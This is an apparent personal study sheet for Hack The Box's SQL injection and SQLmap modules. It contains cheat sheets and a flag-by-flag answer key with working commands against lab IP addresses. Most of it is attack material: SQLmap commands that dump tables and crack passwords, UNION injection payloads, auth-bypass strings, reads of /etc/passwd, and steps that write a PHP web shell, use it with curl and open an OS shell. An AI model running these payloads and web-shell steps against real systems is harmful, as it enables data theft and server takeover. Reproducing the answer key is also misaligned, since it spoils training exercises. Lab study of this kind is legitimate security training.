# SQL Attacking (Complete)
**SQLmap Essentials**  
**SQL Injection Fundermentals**  


## SQLmap Intallation  
sudo apt install sqlmap  
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

## to run SQLMap  
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch  
or refer to cheatsheet/answers

### SQLmapCheat Sheet
The cheat sheet is as a useful command reference for this module.

Command	Description
> - sqlmap -h**	View the basic help menu
> - sqlmap -hh**	View the advanced help menu
> - **sqlmap -u "http://www.example.com/vuln.php?id=1" --batch**	Run SQLMap without asking for user input
> - **sqlmap 'http://www.example.com/' --data 'uid=1&name=test'**	SQLMap with POST request
> - **sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'**	POST request specifying an injection point with an asterisk
> - **sqlmap -r req.txt**	Passing an HTTP request file to SQLMap
> - **sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'**	Specifying a cookie header
> - **sqlmap -u www.target.com --data='id=1' --method PUT**	Specifying a PUT request
> - **sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt**	Store traffic to an output file
> - **sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch**	Specify verbosity level
> - **sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"**	Specifying a prefix or suffix
> - **sqlmap -u www.example.com/?id=1 -v 3 --level=5**	Specifying the level and risk
> - **sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba**	Basic DB enumeration
> - **sqlmap -u "http://www.example.com/?id=1" --tables -D testdb**	Table enumeration  

> - **sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname**	Table/row enumeration
> - **sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"**	Conditional enumeration
> - **sqlmap -u "http://www.example.com/?id=1" --schema**	Database schema enumeration
> - **sqlmap -u "http://www.example.com/?id=1" --search -T user**	Searching for data
> - **sqlmap -u "http://www.example.com/?id=1" --passwords --batch**	Password enumeration and cracking
> - **sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"**	Anti-CSRF token bypass
> - **sqlmap --list-tampers	List all tamper scripts
> - **sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba	Check for DBA privileges
> - **sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"	Reading a local file
> - **sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"	Writing a file
> - **sqlmap -u "http://www.example.com/?id=1" --os-shell	Spawning an OS shell


https://guides.github.com/features/mastering-markdown/


### MySQL Cheatsheet
**General**
> - **mysql -u root -h docker.hackthebox.eu -P 3306 -p	**login to mysql database
> - **SHOW DATABASES	**List available databases
> - **USE users	**Switch to database
**Tables	**
> - **CREATE TABLE logins (id INT, ...)	**Add a new table
> - **SHOW TABLES	**List available tables in current database
> - **DESCRIBE logins	**Show table properties and columns
> - **INSERT INTO table_name VALUES (value_1,..)	**Add values to table
> - **INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)	**Add values to specific columns in a table
> - **UPDATE table_name SET column1=newvalue1, ... WHERE <condition>	**Update table values
Columns	
> - **SELECT * FROM table_name	**Show all columns in a table
> - **SELECT column1, column2 FROM table_name	**Show specific columns in a table
> - **DROP TABLE logins	**Delete a table
> - **ALTER TABLE logins ADD newColumn INT	**Add new column
> - **ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn	**Rename column
> - **ALTER TABLE logins MODIFY oldColumn DATE	**Change column datatype
> - **ALTER TABLE logins DROP oldColumn	**Delete column
**Output	**
> - **SELECT * FROM logins ORDER BY column_1	**Sort by column
> - **SELECT * FROM logins ORDER BY column_1 DESC**	Sort by column in descending order
> - **SELECT * FROM logins ORDER BY column_1 DESC, id ASC	**Sort by two-columns
> - **SELECT * FROM logins LIMIT 2	**Only show first two results
> - **SELECT * FROM logins LIMIT 1, 2	**Only show first two results starting from index 2
> - **SELECT * FROM table_name WHERE <condition>	**List results that meet a condition
> - **SELECT * FROM logins WHERE username LIKE 'admin%'	**List results where the name is similar to a given string
**MySQL Operator Precedence**
> - **Division (/), Multiplication (*), and Modulus (%)
> - **Addition (+) and Subtraction (-)
> - **Comparison (=, >, <, <=, >=, !=, LIKE)
> - **NOT (!)
> - **AND (&&)
> - **OR (||)
**SQL Injection**
**Auth Bypass	**
> - **admin' or '1'='1	**Basic Auth Bypass
> - **admin')-- **-	Basic Auth Bypass With comments
> - **Auth Bypass Payloads	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass**
**Union Injection	**
> - **' order by 1-- **-	Detect number of columns using order by
> - **cn' UNION select 1,2,3-- **-	Detect number of columns using Union injection
> - **cn' UNION select 1,@@version,3,4-- **-	Basic Union injection
> - **UNION select username, 2, 3, 4 from passwords-- **-	Union injection for 4 columns
**DB Enumeration**	
> - **SELECT @@version	**Fingerprint MySQL with query output
> - **SELECT SLEEP(5)	**Fingerprint MySQL with no output
> - **cn' UNION select 1,database(),2,3-- **-	Current database name
> - **cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- **-	List all databases
> - **cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- **-	List all tables in a specific database
> - **cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- **-	List all columns in a specific table
> - **cn' UNION select 1, username, password, 4 from dev.credentials-- **-	Dump data from a table in another database
**Privileges	**
> - **cn' UNION SELECT 1, user(), 3, 4-- **-	Find current user
> - **cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- **-	Find if user has admin privileges
> - **cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- **-	Find if all user privileges
> - **cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- **-	Find which directories can be accessed through MySQL
**File Injection	**
> - **cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -	**Read local file
> - **select 'file written successfully!' into outfile '/var/www/html/proof.txt'	**Write a string to a local file
> - **cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- **-	Write a web shell into the base web directory




### ANSWERS SQLMap ESSENTIALS  
+ What's the contents of table flag2? (Case #2) = Detect and exploit SQLi vulnerability in POST parameter id  
sqlmap -u http://167.71.128.18:30210/case2.php? --data 'id=1' --batch --dump  
+ What's the contents of table flag3? (Case #3) = Detect and exploit SQLi vulnerability in Cookie value id=1  
sqlmap -u http://167.71.128.18:30210/case3.php? --cookie='id=1*' --batch --dump  
+ What's the contents of table flag4? (Case #4) = Detect and exploit SQLi vulnerability in JSON data {"id": 1}
sqlmap -u http://167.71.128.18:30210/case4.php? --batch --data {'"id": 1'} --dump
+ What's the contents of table flag5? (Case #5) = Detect and exploit (OR) SQLi vulnerability in GET parameter id
sqlmap -u http://167.71.138.188:30700/case5.php?id=1 --level=5 --risk=3 --batch --dump
+ What's the contents of table flag6? (Case #6) = Detect and exploit SQLi vulnerability in GET parameter col having non-standard boundaries
sqlmap -u http://167.71.138.188:30700/case6.php?col=id --prefix='`)' --batch --dump
+ What's the contents of table flag7? (Case #7) = Detect and exploit SQLi vulnerability in GET parameter id by usage of UNION query-based technique
qlmap -u http://167.71.138.188:30700/case7.php?id=1 --union-cols=5 --batch --dump
+ What's the contents of table flag1 in the testdb database? (Case #1) = Detect and exploit SQLi vulnerability in GET parameter id
sqlmap -u "http://167.71.138.188:31784/case1.php?id=1" --banner --current-user --current-db --is-dba --batch --dump
+ What's the name of the column containing "style" in it's name? (Case #1) = Detect and exploit SQLi vulnerability in GET parameter id
sqlmap -u "http://165.22.126.213:31234/case1.php?id=1" --search -C style 
+ What's the Kimberly user's password? (Case #1)
sqlmap -u "http://165.22.126.213:31234/case1.php?id=1" --passwords --batch --dump
+ What's the contents of table flag8? (Case #8)
get token name and value via browser > network > requests.
sqlmap -u "http://178.128.163.230:31018/case8.php" --data="id=1&t0ken=Af1394DLz9Q2HfMDehREVTpjL6jlULjqLCrM2UO4vY" --csrf-token="t0ken" --batch --dump
+ What's the contents of table flag9? (Case #9)
sqlmap -u "http://178.128.163.230:31018/case9.php?id=1&uid=29125" --randomize=uid --batch --dump -v 5 | grep HTB
+ What's the contents of table flag10? (Case #10)
sqlmap -u 'http://165.22.113.109:32331/case10.php' --data="id=1" --random-agent --batch --dump
+ What's the contents of table flag11? (Case #11)
sqlmap -u 'http://165.22.113.109:32331/case11.php?id=1' --tamper=between --batch --dump   
+ Try to use SQLMap to read the file "/var/www/html/flag.txt
sqlmap -u "http://134.209.176.83:31022/?id=1" --file-read "/var/www/html/flag.txt"  
+ Use SQLMap to get an interactive OS shell on the remote host and try to find another flag within the host.  
   sqlmap -u "http://134.209.176.83:31022/?id=1" --is-dba  
   35  sqlmap -u "http://134.209.176.83:31022/?id=1" --file-read "/var/www/html/flag.txt" (files is then located in output dir listed) 
   43  echo '<?php system($_GET["cmd"]); ?>' > shell.php
   45  sqlmap -u "http://134.209.176.83:31022/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
   46  curl http://134.209.176.83:31022/shell.php?cmd=ls+-la
   47  sqlmap -u "http://134.209.176.83:31022/?id=1" --os-shell
   in browser DO http://134.209.176.83:31022/shell.php?cmd=cat+/flag.txt
+ What's the contents of table final_flag?  
Playing around with the shopping items and adding to cart registered the post request. Do the old save to a text file. Add the old ‘-p id’ which we got from the POST request and our ‘common’ between tamper script we do some quick ‘-D’ database enumeration to tell us it’s in the production database and our database management system is MySql and it’s technique T (Time-Based boolean) we get the above flag.  
sqlmap -r shoe.txt -p 'id' --tamper=between -T final_flag -D production --dump dbsm=MySql --technique=T
  
  
### Useful Links
https://medium.com/@joshthedev/step-13-sqlmap-essentials-68829d907492



-------- SQL Essentials (HTB) ----------

